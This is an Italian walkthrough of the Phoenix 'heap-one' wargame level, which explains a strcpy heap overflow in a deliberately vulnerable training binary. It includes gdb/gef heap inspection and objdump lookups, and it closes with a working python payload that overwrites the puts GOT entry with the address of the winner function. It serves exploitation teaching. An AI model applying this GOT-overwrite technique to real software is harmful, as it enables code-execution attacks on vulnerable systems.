### Descrizione del Codice

Il programma `heap_one.c` esplora cosa si può fare con la sovrascrittura dei dati.

### Funzionamento del Programma

1. Il programma alloca memoria per due strutture `heapStructure`.
2. Imposta la priorità e alloca memoria per il nome di ciascuna struttura.
3. Copia gli argomenti della riga di comando nei campi `name` delle strutture.
4. Stampa un messaggio di fine.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `strcpy` senza controllare la dimensione, il che può causare un overflow del buffer. Questo può essere sfruttato per sovrascrivere qualsiasi valore in memoria.

### Exploit

L'exploit sfrutta la vulnerabilità di overflow del buffer per sovrascrivere l'indirizzo della funzione `puts` nella Global Offset Table (GOT) con l'indirizzo della funzione `winner`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ gdb -q /opt/phoenix/i486/heap-one
Reading symbols from /opt/phoenix/i486/heap-one...(no debugging symbols found)...done.

gef➤  b *0x08048883
Breakpoint 1 at 0x8048883

gef➤  r AAAA BBBB
Starting program: /opt/phoenix/i486/heap-one AAAA BBBB
Breakpoint 1, 0x08048883 in main ()

gef➤  x/xw $ebp-0xc
0xffffd6fc:	0xf7e69008

gef➤  x/xw $ebp-0x10
0xffffd6f8:	0xf7e69028

gef➤  x/12xw 0xf7e69008
0xf7e69008:	0x00000001	0xf7e69018	0x00000000	0x00000011
0xf7e69018:	0x41414141	0x00000000	0x00000000	0x00000011
0xf7e69028:	0x00000002	0xf7e69038	0x00000000	0x00000011

gef➤  x/12xw 0xf7e69028
0xf7e69028:	0x00000002	0xf7e69038	0x00000000	0x00000011
0xf7e69038:	0x42424242	0x00000000	0x00000000	0x000fffc1
0xf7e69048:	0x00000000	0x00000000	0x00000000	0x00000000

Possiamo vedere che i1 è a 0xf7e69008, il primo valore priority è 0x1 e il secondo valore è l'indirizzo di name restituito da malloc(8) che è 0xf7e69018 e possiamo vedere che strcpy sta scrivendo a quell'indirizzo.

Quindi, se facciamo un overflow di i1 per scrivere all'indirizzo di name di i2, possiamo sovrascrivere qualsiasi valore in memoria con il valore di argv[2]. Ma cosa sovrascrivere?

gef➤  disassemble main 
Dump of assembler code for function main:
   0x0804887e <+169>:	push   0x804ab70
=> 0x08048883 <+174>:	call   0x80485b0 <puts@plt>
   0x08048888 <+179>:	add    esp,0x10

Hai indovinato (spero), sovrascriveremo l'entry della GOT della funzione puts per puntare alla funzione winner.

$ objdump -R /opt/phoenix/i486/heap-one | grep puts
0804c140 R_386_JUMP_SLOT   puts

$ objdump -t /opt/phoenix/i486/heap-one | grep winner
0804889a g     F .text	00000027 winner

puts è a 0x0804c140 e winner è a 0x0804889a, e l'offset necessario = 0xf7e6902c - 0xf7e69018 = 20 byte.

Nota che nell'assembly, la funzione winner usa printf non puts quindi possiamo sovrascrivere in sicurezza la funzione puts.

Soluzione
$ /opt/phoenix/i486/heap-one $(python -c "print 'A'*20 + '\x40\xc1\x04\x08'") $(python -c "print '\x9a\x88\x04\x08'")
Congratulations, you've completed this level @ 1580310733 seconds past the Epoch